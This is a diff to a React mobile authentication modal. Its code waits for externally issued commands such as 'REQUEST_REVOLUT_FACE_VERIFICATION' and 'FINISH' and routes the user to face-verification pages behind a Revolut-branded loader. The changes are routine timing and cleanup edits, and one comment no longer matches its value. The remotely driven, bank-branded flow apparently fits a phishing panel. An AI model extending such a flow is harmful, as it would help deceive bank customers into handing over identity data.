@@ -12,13 +12,18 @@ export default function MobileAuthModal({ displayAuth, resetCommand ,setDisplayA
     const [overlay, setOverlay] = useState(false)
     const [modal, setModal] = useState(false)
     const [displayLoader, setDisplayLoader] = useState(false)
+    const [mounted, setMounted] = useState(false);
     const router = useRouter();
-    const { command } = useCommand(); 
+    const { command } = useCommand();
+
+    useEffect(() => {
+        setMounted(true);
+        return () => setMounted(false);
+      }, []);
 
 
     // This function displays the revolut Loader
     const displayPageLoader = () => {
-        console.log("NOW DISPLAYING PAGE LOADER")
         setDisplayLoader(!displayLoader)
     }
 
@@ -27,7 +32,7 @@ export default function MobileAuthModal({ displayAuth, resetCommand ,setDisplayA
       setDisplayLoader(true);
       
       // Set a minimum display time for the loader (for UX purposes)
-      const minLoaderTime = 1500; // 1.5 seconds
+      const minLoaderTime = 3500; // 1.5 seconds
       const startTime = Date.now();
       
       // Prepare the navigation
@@ -51,34 +56,24 @@ export default function MobileAuthModal({ displayAuth, resetCommand ,setDisplayA
      useEffect(() => {
         if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
             navigateWithLoader('/FaceVerificationPage');
-            // displayPageLoader();
-            // setTimeout(() => {
-            //     console.log("HERE WE WILL PUSH TO FACE VERIFICATION PAGE");
-            //     router.push('/FaceVerificationPage');
-            // }, 3500);
         } else if (command === 'FINISH') {
             navigateWithLoader('/verificationPage');
-            // displayPageLoader();
-            // setTimeout(() => {
-            //     resetCommand(); 
-            //     router.push('/verificationPage');
-            // }, 1500);
         } 
     }, [command, router]);
 
     useEffect(() => {
+        if (!mounted) return;
+    
         if (displayAuth) {
-            // Display the overlay
-            setOverlay(true)
-
-            // after the timeout display the modal
-            setTimeout(() => {
-                setModal(true)
-            }, 300)
+          setOverlay(true);
+          const t = setTimeout(() => setModal(true), 300);
+          return () => clearTimeout(t);
         } else {
-            onMountEffect()
+          setModal(false);
+          const t = setTimeout(() => setOverlay(false), 300);
+          return () => clearTimeout(t);
         }
-    }, [displayAuth])
+      }, [displayAuth, mounted]);
 
     // this function onmount the whole component with transition still intact
     const onMountEffect = () => {
@@ -99,23 +94,7 @@ export default function MobileAuthModal({ displayAuth, resetCommand ,setDisplayA
             }, 200);
         }, 100);
     };
-    // const handleClose = useCallback(() => {
-    //     setModal(false);
-    //     setTimeout(() => {
-    //       setOverlay(false);
-    //       setDisplayAuth(false);
-    //     }, 300);
-    //   }, [setDisplayAuth]);
 
-    //   useEffect(() => {
-    //     if (displayAuth) {
-    //       setOverlay(true);
-    //       const modalTimer = setTimeout(() => setModal(true), 300);
-    //       return () => clearTimeout(modalTimer);
-    //     } else {
-    //       handleClose();
-    //     }
-    //   }, [displayAuth, handleClose]);
 
     return (
         <div className={`fixed w-full h-screen z-[100] inset-0 bg-black bg-opacity-50 justify-center items-center ${overlay ? 'flex' : 'hidden'}`}>
